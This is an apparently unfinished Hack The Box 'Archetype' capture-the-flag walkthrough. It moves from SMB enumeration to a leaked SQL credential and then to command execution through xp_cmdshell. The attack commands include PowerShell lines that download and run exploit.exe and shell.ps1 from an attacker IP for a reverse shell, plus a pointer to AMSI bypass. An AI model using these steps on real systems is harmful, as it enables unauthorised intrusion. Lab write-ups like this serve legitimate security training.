# HTB - Starting points
## Archetype
Windows machine, beginner level
### Initial Access 
First of all, after creating instance, let's scan open ports by using nmap:
```
nmap -n  -sV <ip>
```
![Nmap results](nmap-scan.PNG)

As we can see, the machine have opened ports on 445, 139 (Windows SMB) and 1433 for SQL Server.
Let's try list and access to directories (```-L``` flag) as anonymous user (```-N``` flag).
```
smbclient -N -L \\\\<ip>\\
```
![SMB check](samba-chck.PNG)
```
smbclient -N \\\\<ip>\\backup
```
![SMB backup folder](samba-bckp.PNG)

Checking backups folder give us information about interesting file `prod.dtsConfig`. Let's download it and check what's inside - use `get` inside `smb>`.

>A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages.

![Dst file](dstbackp.PNG)

We obtained plaintext user and password for SQL server:

```Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;```

We can try to login to SQL server with obtained credentials.
I found useful link from [hacktricks.xyz](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server#mssqlclient-py).
Used ```mssqlclient.py``` script from [Impacket repository](https://github.com/SecureAuthCorp/impacket) to gain access.

![Impacket](impacket.PNG)

```
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth     
```

![mssql](mssql.PNG)

With that, we can try to check if we have the highest ```sysadmin``` privileges. 
```
SELECT IS_SRVROLEMEMBER ('sysadmin')
```
If we have in return ```1``` response, we have the access to sysadmin.
In SQL with the highest privileges we can set up remote code execution via SQL service (```xp_cmdshell```).
We need to enable it and reconfigure.
![sql_rce](sql_rce.PNG)

As we can see our SQL service also running in archetype\sql_svc user contex, so we need to obtain access to normal user.

Let's try to drop shell into user context.


I used [this website](https://www.revshells.com/) to create powershell reverse shell.

Then run a listener and host created shell via http server.
```
nc -lvnp 4444
python3 -m http.server 80
```
Download shell from http server via ```xp_cmdshell```:
```
xp_cmdshell "powershell Invoke-WebRequest -Uri "http://10.10.15.147/exploit.exe" -OutFile exploit.exe;"
xp_cmdshell "powershell "IEX (New-ObjectNet.WebClient).DownloadString("http://10.10.15.147/shell.ps1");"
```


We have to bypass AMSI (Anti Malware Security Interface)...
https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/

TBC...

### Privilege Escalation